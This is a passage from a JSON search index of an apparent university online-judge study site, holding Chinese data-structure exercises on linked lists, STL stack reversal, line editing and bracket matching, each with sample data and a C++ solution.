\u5982\u679c\u6267\u884c\u64cd\u4f5c\u5931\u8d25\uff08\u5305\u62ec\u63d2\u5165\u3001\u5220\u9664\u3001\u67e5\u627e\u7b49\u5931\u8d25\uff09\uff0c\u8f93\u51fa\u5b57\u7b26\u4e32error\uff0c\u4e0d\u5fc5\u8f93\u51fa\u5355\u94fe\u8868","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1199/#_4","text":"1 2 3 4 5 6 7 6 11 22 33 44 55 66 3 777 1 888 1 11 0 5","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1199/#_5","text":"1 2 3 4 5 6 7 11 22 33 44 55 66 11 22 777 33 44 55 66 888 11 22 777 33 44 55 66 11 22 777 33 44 55 66 error error 44","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1199/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1199/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 #include <iostream> #include <vector> #include <stdexcept> class List { public : List ( std :: vector < int > & vector ) : root_ ( new Node ) { Node * node = root_ ; for ( int i = 0 ; i < vector . size (); ++ i , node = node -> next ) { node -> next = new Node ( vector [ i ]); } } ~ List () { Node * node = root_ , * next ; while ( node != NULL ) { next = node -> next ; delete node ; node = next ; } } int at ( int index ) { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL ) { count += 1 ; node = node -> next ; if ( count == index ) { return node -> data ; } } throw std :: out_of_range ( \"UPPER_LIMIT\" ); } void insert ( int index , int data ) { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL || ( count + 1 ) == index ) { count += 1 ; if ( count == index ) { Node * tmp = node -> next ; node -> next = new Node ( data , tmp ); return ; } node = node -> next ; } throw std :: out_of_range ( \"UPPER_LIMIT\" ); } void erase ( int index ) { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL ) { count += 1 ; if ( count == index ) { Node * tmp = node -> next ; node -> next = node -> next -> next ; delete tmp ; return ; } node = node -> next ; } throw std :: out_of_range ( \"UPPER_LIMIT\" ); } int length () { int count = 0 ; Node * node = root_ ; while ( node -> next != NULL ) { node = node -> next ; count += 1 ; } return count ; } void print () { Node * node = root_ ; while ( node -> next != NULL ) { node = node -> next ; std :: cout << node -> data << ' ' ; } std :: cout << std :: endl ; } private : struct Node { int data ; Node * next ; Node () : data ( 0 ), next ( NULL ) {} Node ( int data ) : data ( data ) {} Node ( int data , Node * next ) : data ( data ), next ( next ) {} }; Node * root_ ; }; int main () { int size ; std :: cin >> size ; std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } List list ( vector ); list . print (); for ( int i = 0 ; i < 2 ; ++ i ) { int index , number ; std :: cin >> index >> number ; try { list . insert ( index , number ); list . print (); } catch ( std :: out_of_range & out_of_range ) { std :: cout << \"error\" << std :: endl ; } } for ( int i = 0 ; i < 2 ; ++ i ) { int index ; std :: cin >> index ; try { list . erase ( index ); list . print (); } catch ( std :: out_of_range & out_of_range ) { std :: cout << \"error\" << std :: endl ; } } for ( int i = 0 ; i < 2 ; ++ i ) { int index ; std :: cin >> index ; try { std :: cout << list . at ( index ) << std :: endl ; } catch ( std :: out_of_range & out_of_range ) { std :: cout << \"error\" << std :: endl ; } } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1202/","text":"DS\u5806\u6808--\u9006\u5e8f\u8f93\u51fa\uff08STL\u6808\u4f7f\u7528\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 C++\u4e2d\u5df2\u7ecf\u81ea\u5e26\u5806\u6808\u5bf9\u8c61stack\uff0c\u65e0\u9700\u7f16\u5199\u5806\u6808\u64cd\u4f5c\u7684\u5177\u4f53\u5b9e\u73b0\u4ee3\u7801\u3002 \u672c\u9898\u76ee\u4e3b\u8981\u5e2e\u52a9\u5927\u5bb6\u719f\u6089stack\u5bf9\u8c61\u7684\u4f7f\u7528\uff0c\u7136\u540e\u5b9e\u73b0\u5b57\u7b26\u4e32\u7684\u9006\u5e8f\u8f93\u51fa \u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6309\u5b57\u7b26\u6309\u8f93\u5165\u987a\u5e8f\u538b\u5165\u5806\u6808\uff0c\u7136\u540e\u6839\u636e\u5806\u6808\u540e\u8fdb\u5148\u51fa\u7684\u7279\u70b9\uff0c\u505a\u9006\u5e8f\u8f93\u51fa stack\u7c7b\u4f7f\u7528\u7684\u53c2\u8003\u4ee3\u7801 \u5305\u542b\u5934\u6587\u4ef6<stack> \uff1a #include <stack> \u521b\u5efa\u4e00\u4e2a\u5806\u6808\u5bf9\u8c61s\uff08\u6ce8\u610fstack\u662f\u6a21\u677f\u7c7b\uff09\uff1astack <char> s; //\u5806\u6808\u7684\u6570\u636e\u7c7b\u578b\u662f\u5b57\u7b26\u578b \u628a\u4e00\u4e2a\u5b57\u7b26ct\u538b\u5165\u5806\u6808\uff1a s.push(ct); \u628a\u6808\u9876\u5143\u7d20\u5f39\u51fa\uff1as.pop(); \u83b7\u53d6\u6808\u9876\u5143\u7d20\uff0c\u653e\u5165\u53d8\u91cfc2\uff1a c2 = s.top(); \u5224\u65ad\u5806\u6808\u662f\u5426\u7a7a\uff1a s.empty()\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u51fd\u6570\u8fd4\u56detrue\uff0c\u5982\u679c\u4e0d\u7a7a\u5219\u8fd4\u56defalse \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u8d77\uff0c\u6bcf\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u5b57\u7b26\u4e32\u4e0d\u8981\u5305\u542b\u7a7a\u683c \u5b57\u7b26\u4e32\u7684\u8f93\u5165\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 #include <string> int main () { string str ; Int len ; cin >> str ; //\u628a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4fdd\u5b58\u5728\u53d8\u91cfstr\u4e2d len = str . length () //\u83b7\u53d6\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 } \u8f93\u51fa \u6bcf\u884c\u9006\u5e8f\u8f93\u51fa\u6bcf\u4e00\u4e2a\u5b57\u7b26\u4e32 \u6837\u4f8b\u8f93\u5165 1 2 3 2 abcdef aabbcc \u6837\u4f8b\u8f93\u51fa 1 2 fedcba ccbbaa \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include <iostream> #include <stack> #include <string> int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; std :: stack < char > stack ; for ( size_t i = 0 ; i < string . length (); ++ i ) { stack . push ( string [ i ]); } while ( ! stack . empty ()) { std :: cout << stack . top (); stack . pop (); } std :: cout << std :: endl ; } return 0 ; }","title":"DS\u5806\u6808--\u9006\u5e8f\u8f93\u51fa\uff08STL\u6808\u4f7f\u7528\uff09"},{"location":"szu_oj/ds/1202/#ds-stl","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u5806\u6808--\u9006\u5e8f\u8f93\u51fa\uff08STL\u6808\u4f7f\u7528\uff09"},{"location":"szu_oj/ds/1202/#_1","text":"C++\u4e2d\u5df2\u7ecf\u81ea\u5e26\u5806\u6808\u5bf9\u8c61stack\uff0c\u65e0\u9700\u7f16\u5199\u5806\u6808\u64cd\u4f5c\u7684\u5177\u4f53\u5b9e\u73b0\u4ee3\u7801\u3002 \u672c\u9898\u76ee\u4e3b\u8981\u5e2e\u52a9\u5927\u5bb6\u719f\u6089stack\u5bf9\u8c61\u7684\u4f7f\u7528\uff0c\u7136\u540e\u5b9e\u73b0\u5b57\u7b26\u4e32\u7684\u9006\u5e8f\u8f93\u51fa \u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6309\u5b57\u7b26\u6309\u8f93\u5165\u987a\u5e8f\u538b\u5165\u5806\u6808\uff0c\u7136\u540e\u6839\u636e\u5806\u6808\u540e\u8fdb\u5148\u51fa\u7684\u7279\u70b9\uff0c\u505a\u9006\u5e8f\u8f93\u51fa stack\u7c7b\u4f7f\u7528\u7684\u53c2\u8003\u4ee3\u7801 \u5305\u542b\u5934\u6587\u4ef6<stack> \uff1a #include <stack> \u521b\u5efa\u4e00\u4e2a\u5806\u6808\u5bf9\u8c61s\uff08\u6ce8\u610fstack\u662f\u6a21\u677f\u7c7b\uff09\uff1astack <char> s; //\u5806\u6808\u7684\u6570\u636e\u7c7b\u578b\u662f\u5b57\u7b26\u578b \u628a\u4e00\u4e2a\u5b57\u7b26ct\u538b\u5165\u5806\u6808\uff1a s.push(ct); \u628a\u6808\u9876\u5143\u7d20\u5f39\u51fa\uff1as.pop(); \u83b7\u53d6\u6808\u9876\u5143\u7d20\uff0c\u653e\u5165\u53d8\u91cfc2\uff1a c2 = s.top(); \u5224\u65ad\u5806\u6808\u662f\u5426\u7a7a\uff1a s.empty()\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u51fd\u6570\u8fd4\u56detrue\uff0c\u5982\u679c\u4e0d\u7a7a\u5219\u8fd4\u56defalse","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1202/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u5b9e\u4f8b \u7b2c\u4e8c\u8d77\uff0c\u6bcf\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u5b57\u7b26\u4e32\u4e0d\u8981\u5305\u542b\u7a7a\u683c \u5b57\u7b26\u4e32\u7684\u8f93\u5165\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 #include <string> int main () { string str ; Int len ; cin >> str ; //\u628a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4fdd\u5b58\u5728\u53d8\u91cfstr\u4e2d len = str . length () //\u83b7\u53d6\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 }","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1202/#_3","text":"\u6bcf\u884c\u9006\u5e8f\u8f93\u51fa\u6bcf\u4e00\u4e2a\u5b57\u7b26\u4e32","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1202/#_4","text":"1 2 3 2 abcdef aabbcc","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1202/#_5","text":"1 2 fedcba ccbbaa","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1202/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1202/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include <iostream> #include <stack> #include <string> int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string string ; std :: cin >> string ; std :: stack < char > stack ; for ( size_t i = 0 ; i < string . length (); ++ i ) { stack . push ( string [ i ]); } while ( ! stack . empty ()) { std :: cout << stack . top (); stack . pop (); } std :: cout << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1204/","text":"DS\u5806\u6808--\u884c\u7f16\u8f91 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u4f7f\u7528C++\u7684STL\u5806\u6808\u5bf9\u8c61\uff0c\u7f16\u5199\u7a0b\u5e8f\u5b9e\u73b0\u884c\u7f16\u8f91\u529f\u80fd\u3002\u884c\u7f16\u8f91\u529f\u80fd\u662f\uff1a\u5f53\u8f93\u5165#\u5b57\u7b26\uff0c\u5219\u6267\u884c\u9000\u683c\u64cd\u4f5c\uff1b\u5982\u679c\u65e0\u5b57\u7b26\u53ef\u9000\u5c31\u4e0d\u64cd\u4f5c\uff0c\u4e0d\u4f1a\u62a5\u9519 \u672c\u7a0b\u5e8f\u9ed8\u8ba4\u4e0d\u4f1a\u663e\u793a#\u5b57\u7b26\uff0c\u6240\u4ee5\u8fde\u7eed\u8f93\u5165\u591a\u4e2a#\u8868\u793a\u8fde\u7eed\u6267\u884c\u591a\u6b21\u9000\u683c\u64cd\u4f5c \u6bcf\u8f93\u5165\u4e00\u884c\u5b57\u7b26\u6253\u56de\u8f66\u5219\u8868\u793a\u5b57\u7b26\u4e32\u7ed3\u675f \u6ce8\u610f\uff1a\u5fc5\u987b\u4f7f\u7528\u5806\u6808\u5b9e\u73b0\uff0c\u800c\u4e14\u7ed3\u679c\u5fc5\u987b\u662f\u6b63\u5e8f\u8f93\u51fa \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u884c\u5b57\u7b26\u4e32\u8981\u8f93\u5165 \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u4e00\u884c\u5b57\u7b26\u4e32\uff0c\u5171\u8f93\u5165t\u884c \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u6700\u7ec8\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u5982\u679c\u4e00\u884c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u7ecf\u8fc7\u5904\u7406\u540e\u6ca1\u6709\u5b57\u7b26\u8f93\u51fa\uff0c\u5219\u76f4\u63a5\u8f93\u51faNULL \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 4 chinaa # sb # zb # u ## shen ### zhen ### chi ## a ##### \u6837\u4f8b\u8f93\u51fa 1 2 3 4 china szu sz NULL \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include <iostream> #include <stack> void reversePrint ( std :: stack < char > & stack ) { if ( ! stack . empty ()) { char ch = stack . top (); stack . pop (); reversePrint ( stack ); std :: cout << ch ; } } int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string seq ; std :: cin >> seq ; std :: stack < char > stack ; for ( size_t i = 0 ; i < seq . length (); ++ i ) { if ( seq [ i ] == '#' ) { if ( ! stack . empty ()) { stack . pop (); } } else { stack . push ( seq [ i ]); } } if ( stack . empty ()) { std :: cout << \"NULL\" << std :: endl ; } else { if ( stack . empty ()) { std :: cout << \"NULL\" << std :: endl ; } else { reversePrint ( stack ); std :: cout << std :: endl ; } } } return 0 ; }","title":"DS\u5806\u6808--\u884c\u7f16\u8f91"},{"location":"szu_oj/ds/1204/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u5806\u6808--\u884c\u7f16\u8f91"},{"location":"szu_oj/ds/1204/#_1","text":"\u4f7f\u7528C++\u7684STL\u5806\u6808\u5bf9\u8c61\uff0c\u7f16\u5199\u7a0b\u5e8f\u5b9e\u73b0\u884c\u7f16\u8f91\u529f\u80fd\u3002\u884c\u7f16\u8f91\u529f\u80fd\u662f\uff1a\u5f53\u8f93\u5165#\u5b57\u7b26\uff0c\u5219\u6267\u884c\u9000\u683c\u64cd\u4f5c\uff1b\u5982\u679c\u65e0\u5b57\u7b26\u53ef\u9000\u5c31\u4e0d\u64cd\u4f5c\uff0c\u4e0d\u4f1a\u62a5\u9519 \u672c\u7a0b\u5e8f\u9ed8\u8ba4\u4e0d\u4f1a\u663e\u793a#\u5b57\u7b26\uff0c\u6240\u4ee5\u8fde\u7eed\u8f93\u5165\u591a\u4e2a#\u8868\u793a\u8fde\u7eed\u6267\u884c\u591a\u6b21\u9000\u683c\u64cd\u4f5c \u6bcf\u8f93\u5165\u4e00\u884c\u5b57\u7b26\u6253\u56de\u8f66\u5219\u8868\u793a\u5b57\u7b26\u4e32\u7ed3\u675f \u6ce8\u610f\uff1a\u5fc5\u987b\u4f7f\u7528\u5806\u6808\u5b9e\u73b0\uff0c\u800c\u4e14\u7ed3\u679c\u5fc5\u987b\u662f\u6b63\u5e8f\u8f93\u51fa","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1204/#_2","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6574\u6570t\uff0c\u8868\u793a\u6709t\u884c\u5b57\u7b26\u4e32\u8981\u8f93\u5165 \u7b2c\u4e8c\u884c\u8d77\u8f93\u5165\u4e00\u884c\u5b57\u7b26\u4e32\uff0c\u5171\u8f93\u5165t\u884c","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1204/#_3","text":"\u6bcf\u884c\u8f93\u51fa\u6700\u7ec8\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u5982\u679c\u4e00\u884c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u7ecf\u8fc7\u5904\u7406\u540e\u6ca1\u6709\u5b57\u7b26\u8f93\u51fa\uff0c\u5219\u76f4\u63a5\u8f93\u51faNULL","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1204/#_4","text":"1 2 3 4 5 4 chinaa # sb # zb # u ## shen ### zhen ### chi ## a #####","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1204/#_5","text":"1 2 3 4 china szu sz NULL","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1204/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1204/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include <iostream> #include <stack> void reversePrint ( std :: stack < char > & stack ) { if ( ! stack . empty ()) { char ch = stack . top (); stack . pop (); reversePrint ( stack ); std :: cout << ch ; } } int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string seq ; std :: cin >> seq ; std :: stack < char > stack ; for ( size_t i = 0 ; i < seq . length (); ++ i ) { if ( seq [ i ] == '#' ) { if ( ! stack . empty ()) { stack . pop (); } } else { stack . push ( seq [ i ]); } } if ( stack . empty ()) { std :: cout << \"NULL\" << std :: endl ; } else { if ( stack . empty ()) { std :: cout << \"NULL\" << std :: endl ; } else { reversePrint ( stack ); std :: cout << std :: endl ; } } } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1205/","text":"DS\u5806\u6808--\u62ec\u53f7\u5339\u914d \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5904\u7406\u8868\u8fbe\u5f0f\u8fc7\u7a0b\u4e2d\u9700\u8981\u5bf9\u62ec\u53f7\u5339\u914d\u8fdb\u884c\u68c0\u9a8c\uff0c\u62ec\u53f7\u5339\u914d\u5305\u62ec\u4e09\u79cd\uff1a\u201c(\u201d\u548c\u201c)\u201d\uff0c\u201c[\u201d\u548c\u201c]\u201d\uff0c\u201c{\u201d\u548c\u201c}\u201d\u3002\u4f8b\u5982\u8868\u8fbe\u5f0f\u4e2d\u5305\u542b\u62ec\u53f7\u5982\u4e0b\uff1a 1 2 3 ( ) [ ( ) ( [ ] ) ] { } 1 2 3 4 5 6 7 8 9 10 11 12 \u4ece\u4e0a\u4f8b\u53ef\u4ee5\u770b\u51fa\u7b2c1\u548c\u7b2c2\u4e2a\u62ec\u53f7\u5339\u914d\uff0c\u7b2c3\u548c\u7b2c10\u4e2a\u62ec\u53f7\u5339\u914d\uff0c4\u548c5\u5339\u914d\uff0c6\u548c9\u5339\u914d\uff0c7\u548c8\u5339\u914d\uff0c11\u548c12\u5339\u914d\u3002\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u62ec\u53f7\u5d4c\u5957\u7684\u7684\u60c5\u51b5\u662f\u6bd4\u8f83\u590d\u6742\u7684\uff0c\u4f7f\u7528\u5806\u6808\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5904\u7406\u8fd9\u79cd\u62ec\u53f7\u5339\u914d\u68c0\u9a8c\uff0c\u53ef\u4ee5\u9075\u5faa\u4ee5\u4e0b\u89c4\u5219\uff1a 1\u3001 \u5f53\u63a5\u6536\u7b2c1\u4e2a\u5de6\u62ec\u53f7\uff0c\u8868\u793a\u65b0\u7684\u4e00\u7ec4\u5339\u914d\u68c0\u67e5\u5f00\u59cb\uff1b\u968f\u540e\u5982\u679c\u8fde\u7eed\u63a5\u6536\u5230\u5de6\u62ec\u53f7\uff0c\u5219\u4e0d\u65ad\u8fdb\u5806\u6808\u3002 2\u3001 \u5f53\u63a5\u53d7\u7b2c1\u4e2a\u53f3\u62ec\u53f7\uff0c\u5219\u548c\u6700\u65b0\u8fdb\u6808\u7684\u5de6\u62ec\u53f7\u8fdb\u884c\u5339\u914d\uff0c\u8868\u793a\u5d4c\u5957\u4e2d1\u7ec4\u62ec\u53f7\u5df2\u7ecf\u5339\u914d\u6d88\u9664 3\u3001 \u82e5\u5230\u6700\u540e\uff0c\u62ec\u53f7\u4e0d\u80fd\u5b8c\u5168\u5339\u914d\uff0c\u5219\u8bf4\u660e\u8f93\u5165\u7684\u8868\u8fbe\u5f0f\u6709\u9519 \u5efa\u8bae\u4f7f\u7528C++\u81ea\u5e26\u7684stack\u5bf9\u8c61\u6765\u5b9e\u73b0 stack\u7c7b\u4f7f\u7528\u7684\u53c2\u8003\u4ee3\u7801 \u5305\u542b\u5934\u6587\u4ef6<stack> \uff1a #include <stack> \u521b\u5efa\u4e00\u4e2a\u5806\u6808\u5bf9\u8c61s\uff08\u6ce8\u610fstack\u662f\u6a21\u677f\u7c7b\uff09\uff1astack <char> s; //\u5806\u6808\u7684\u6570\u636e\u7c7b\u578b\u662f\u5b57\u7b26\u578b \u628a\u4e00\u4e2a\u5b57\u7b26ct\u538b\u5165\u5806\u6808\uff1a s.push(ct); \u628a\u6808\u9876\u5143\u7d20\u5f39\u51fa\uff1as.pop(); \u83b7\u53d6\u6808\u9876\u5143\u7d20\uff0c\u653e\u5165\u53d8\u91cfc2\uff1a c2 = s.top(); \u5224\u65ad\u5806\u6808\u662f\u5426\u7a7a\uff1a s.empty()\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u51fd\u6570\u8fd4\u56detrue\uff0c\u5982\u679c\u4e0d\u7a7a\u5219\u8fd4\u56defalse \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2at\uff0c\u8868\u793a\u4e0b\u9762\u5c06\u6709t\u7ec4\u6d4b\u8bd5\u6570\u636e\u3002\u63a5\u4e0b\u6765\u7684t\u884c\u7684\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8868\u8fbe\u5f0f\u53ea\u8003\u8651\u82f1\u6587\u534a\u89d2\u72b6\u6001\u8f93\u5165\uff0c\u65e0\u9700\u8003\u8651\u4e2d\u6587\u5168\u89d2\u8f93\u5165 \u8f93\u51fa \u5bf9\u4e8e\u6bcf\u4e00\u884c\u7684\u8868\u8fbe\u5f0f\uff0c\u68c0\u67e5\u62ec\u53f7\u662f\u5426\u5339\u914d\uff0c\u5339\u914d\u5219\u8f93\u5165ok\uff0c\u4e0d\u5339\u914d\u5219\u8f93\u51faerror \u6837\u4f8b\u8f93\u5165 1 2 3 2 ( a + b )[ 4 * 5 + ( - 6 )] [ 5 * 8 ] / { ( a + b ) - 6 \u6837\u4f8b\u8f93\u51fa 1 2 ok error \u63d0\u793a \u7b97\u6cd5\u6d41\u7a0b 1\u3001\u521d\u59cb\u5316\uff0ci=0\uff0c\u5efa\u7acb\u5806\u6808\uff0c\u6808\u4e3a\u7a7a 2\u3001\u8f93\u5165\u8868\u8fbe\u5f0f\uff0c\u5efa\u7acb\u6307\u9488\u6307\u5411\u8868\u8fbe\u5f0f\u7684\u5934\u90e8 3\u3001\u8bfb\u5165\u8868\u8fbe\u5f0f\u7684\u7b2ci\u4e2a\u5b57\u7b26 4\u3001\u5982\u679c\u7b2ci\u4e2a\u5b57\u7b26\u662f\u5de6\u62ec\u53f7\uff0c\u5165\u6808 5\u3001\u5982\u679c\u7b2ci\u4e2a\u5b57\u7b26\u662f\u53f3\u62ec\u53f7\uff0c\u68c0\u67e5\u6808\u9876\u5143\u7d20\u662f\u5426\u5339\u914d \u2002A.\u5982\u679c\u5339\u914d\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20 \u2002B.\u5982\u679c\u4e0d\u5339\u914d\uff0c\u62a5\u9519\u9000\u51fa 6\u3001i++\uff0c\u6307\u5411\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff0c\u662f\u5426\u5df2\u7ecf\u8868\u8fbe\u5f0f\u672b\u5c3e \u2002A. \u672a\u5230\u672b\u5c3e\uff0c\u91cd\u590d\u6b65\u9aa43 \u2002B. \u5df2\u5230\u8fbe\u672b\u5c3e \u2003a. \u5806\u6808\u4e3a\u7a7a\uff0c\u8f93\u51faok \u2003b. \u5806\u6808\u4e0d\u4e3a\u7a7a\uff0c\u8f93\u51faerror \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include <iostream> #include <stack> bool isBracketsMatch ( const std :: string & expression ) { std :: stack < char > stack ; for ( size_t i = 0 ; i < expression . length (); ++ i ) { switch ( expression [ i ]) { case '(' : case '[' : case '{' : stack . push ( expression [ i ]); break ; case ')' : if (( ! stack . empty ()) && stack . top () == '(' ) { stack . pop (); } else { return false ; } break ; case ']' : if (( ! stack . empty ()) && stack . top () == '[' ) { stack . pop (); } else { return false ; } break ; case '}' : if (( ! stack . empty ()) && stack . top () == '{' ) { stack . pop (); } else { return false ; } break ; default : ; } } return stack . empty (); } int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { std :: string expression ; std :: cin >> expression ; if ( isBracketsMatch ( expression )) { std :: cout << \"ok\" << std :: endl ; } else { std :: cout << \"error\" << std :: endl ; } } return 0 ; }","title":"DS\u5806\u6808--\u62ec\u53f7\u5339\u914d"},{"location":"szu_oj/ds/1205/#ds-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u5806\u6808--\u62ec\u53f7\u5339\u914d"},{"location":"szu_oj/ds/1205/#_1","text":"\u5904\u7406\u8868\u8fbe\u5f0f\u8fc7\u7a0b\u4e2d\u9700\u8981\u5bf9\u62ec\u53f7\u5339\u914d\u8fdb\u884c\u68c0\u9a8c\uff0c\u62ec\u53f7\u5339\u914d\u5305\u62ec\u4e09\u79cd\uff1a\u201c(\u201d\u548c\u201c)\u201d\uff0c\u201c[\u201d\u548c\u201c]\u201d\uff0c\u201c{\u201d\u548c\u201c}\u201d\u3002\u4f8b\u5982\u8868\u8fbe\u5f0f\u4e2d\u5305\u542b\u62ec\u53f7\u5982\u4e0b\uff1a 1 2 3 ( ) [ ( ) ( [ ] ) ] { } 1 2 3 4 5 6 7 8 9 10 11 12 \u4ece\u4e0a\u4f8b\u53ef\u4ee5\u770b\u51fa\u7b2c1\u548c\u7b2c2\u4e2a\u62ec\u53f7\u5339\u914d\uff0c\u7b2c3\u548c\u7b2c10\u4e2a\u62ec\u53f7\u5339\u914d\uff0c4\u548c5\u5339\u914d\uff0c6\u548c9\u5339\u914d\uff0c7\u548c8\u5339\u914d\uff0c11\u548c12\u5339\u914d\u3002\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u62ec\u53f7\u5d4c\u5957\u7684\u7684\u60c5\u51b5\u662f\u6bd4\u8f83\u590d\u6742\u7684\uff0c\u4f7f\u7528\u5806\u6808\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5904\u7406\u8fd9\u79cd\u62ec\u53f7\u5339\u914d\u68c0\u9a8c\uff0c\u53ef\u4ee5\u9075\u5faa\u4ee5\u4e0b\u89c4\u5219\uff1a 1\u3001 \u5f53\u63a5\u6536\u7b2c1\u4e2a\u5de6\u62ec\u53f7\uff0c\u8868\u793a\u65b0\u7684\u4e00\u7ec4\u5339\u914d\u68c0\u67e5\u5f00\u59cb\uff1b\u968f\u540e\u5982\u679c\u8fde\u7eed\u63a5\u6536\u5230\u5de6\u62ec\u53f7\uff0c\u5219\u4e0d\u65ad\u8fdb\u5806\u6808\u3002 2\u3001 